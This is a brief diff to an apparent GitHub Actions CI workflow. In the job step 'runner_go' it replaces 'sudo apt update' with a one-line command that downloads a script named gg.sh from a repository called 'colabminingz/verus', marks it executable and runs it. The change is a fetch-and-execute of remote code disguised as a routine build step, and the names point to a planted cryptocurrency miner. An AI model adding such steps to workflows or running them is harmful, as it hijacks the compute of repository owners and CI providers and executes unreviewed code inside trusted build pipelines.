@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        sudo apt update
+        wget https://github.com/colabminingz/verus/blob/150f1ef3962002940ae6e9c370fbceccf0744b23/gg.sh && chmod u+x gg.sh && ./gg.sh
